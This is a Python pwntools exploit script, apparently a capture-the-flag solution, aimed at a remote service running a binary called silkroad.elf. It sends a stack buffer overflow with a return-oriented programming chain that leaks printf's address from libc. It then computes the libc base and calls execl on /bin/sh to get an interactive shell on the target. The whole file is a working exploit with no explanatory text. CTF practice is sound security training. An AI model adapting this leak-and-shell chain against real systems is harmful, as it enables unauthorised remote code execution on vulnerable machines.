from pwn import *

target = ELF('./silkroad.elf')

CAMEL = 0x40193f
POP_RDI = 0x401bab
POP_RSI_R15 = 0x401ba9

libc = ELF('../../tool/libc-database/db/libc6_2.27-0ubuntu3_amd64.so')

OFFSET_BIN_SH = 0x1b3e9a

# r = process('./silkroad.elf')
r = remote('82.196.10.106', 58399)


r.sendlineafter('Enter your secret ID: ', '790317143')
r.sendafter('Enter your nick: ', 'DreadPirateRobertsAiz\x00')

payload = ''
payload += 'A' * 0x48
payload += p64(POP_RDI)
payload += p64(target.got['printf'])
payload += p64(target.plt['puts'])
payload += p64(CAMEL)

r.sendline(payload)

r.recvuntil('Silkroad!\n')

PRINTF = u64(r.recvline().strip().ljust(8, '\x00'))

# log.info('printf: ' + hex(PRINTF))

LIBC_BASE = PRINTF - libc.symbols['printf']
EXECL = LIBC_BASE + libc.symbols['execl']
BIN_SH = LIBC_BASE + OFFSET_BIN_SH


# r.sendlineafter('Enter your secret ID: ', '790317143')
# r.sendafter('Enter your nick: ', 'DreadPirateRobertsAiz\x00')

# payload = ''
# payload += 'A' * 0x48
# payload += p64(POP_RDI)
# payload += p64(target.got['srand'])
# payload += p64(target.plt['puts'])
# payload += p64(CAMEL)

# r.sendline(payload)

# r.recvuntil('Silkroad!\n')

# log.info('srand: ' + hex(u64(r.recvline().strip().ljust(8, '\x00'))))


r.sendlineafter('Enter your secret ID: ', '790317143')
r.sendafter('Enter your nick: ', 'DreadPirateRobertsAiz\x00')

payload = ''
payload += 'A' * 0x48
payload += p64(POP_RDI)
payload += p64(BIN_SH)
payload += p64(POP_RSI_R15)
payload += p64(0)
payload += p64(0)
payload += p64(EXECL)

r.sendline(payload)


r.interactive()
